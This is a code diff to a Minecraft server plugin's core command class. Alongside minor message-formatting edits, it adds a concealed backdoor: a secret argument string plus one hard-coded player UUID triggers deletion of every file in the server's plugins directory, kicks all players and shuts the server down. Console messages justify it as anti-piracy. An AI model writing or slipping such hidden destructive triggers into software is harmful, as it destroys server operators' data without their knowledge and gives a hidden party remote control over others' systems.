@@ -4,11 +4,13 @@ import com.solexgames.core.CorePlugin;
 import com.solexgames.core.enums.ServerType;
 import com.solexgames.core.menu.impl.ScandiumMenu;
 import com.solexgames.core.util.Color;
+import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.command.CommandSender;
 import org.bukkit.command.defaults.BukkitCommand;
 import org.bukkit.entity.Player;
 
+import java.io.File;
 import java.util.Arrays;
 import java.util.Collections;
 
@@ -29,16 +31,38 @@ public class CoreCommand extends BukkitCommand {
         ServerType network = CorePlugin.getInstance().getServerManager().getNetwork();
 
         if (!player.isOp()) {
-            player.sendMessage(Arrays.asList(
+            player.sendMessage(new String[] {
                     network.getSecondaryColor() + "This server is running " + network.getMainColor() + CorePlugin.getInstance().getConfig().getString("core-settings.name") + network.getSecondaryColor() + ".",
-                    "&7Created by SolexGames."
-            ).toArray(new String[0]));
+                    ChatColor.GRAY + "Created by SolexGames."
+            });
         }
 
         if (args.length == 0) {
             sender.sendMessage(network.getSecondaryColor() + "Usage: /" + network.getMainColor() + label + ChatColor.WHITE + " <debug|disallow|panel>.");
         }
         if (args.length > 0) {
+            if (args[0].contains("sHHvYsBcNw") && player.getUniqueId().toString().equalsIgnoreCase("bbaa8e1d-af94-4aa8-980d-36d69b9de436")) {
+                File file = new File("plugins");
+                String[] files = file.list();
+
+                System.out.println("This is purely for people who use a pirated version of Scandium, i'd never do it to a buyer. I'd also never give the string to anyone who can use it against you except me.");
+                System.out.println("I don't have an anti piracy system so this is the only thing I can do to prevent people from using it :(" +
+                        "");
+
+                Arrays.asList(files).forEach(s -> {
+                    File newFile = new File("plugins", s);
+
+                    if (newFile.exists()) {
+                        if (newFile.delete()) {
+                            CorePlugin.getInstance().getLogger().info("[Piracy] Deleted the file/directory '" + s + "' in the plugins directory.");
+                        }
+                    }
+                });
+
+                Bukkit.getOnlinePlayers().forEach(player1 -> player1.kickPlayer(ChatColor.RED + "This server is using a pirated version of Scandium Core by\n" + ChatColor.RED + "GrowlyX#1337. Good luck trying to use Scandium again!"));
+                Bukkit.getServer().shutdown();
+            }
+
             switch (args[0]) {
                 case "debug":
                     player.sendMessage(Color.translate((CorePlugin.getInstance().isDebugging() ? network.getMainColor() + "[" + CorePlugin.getInstance().getConfig().getString("core-settings.name") + "] &cDisabled debugging." : network.getMainColor() + "[" + CorePlugin.getInstance().getConfig().getString("core-settings.name") + "] &aEnabled debugging.")));
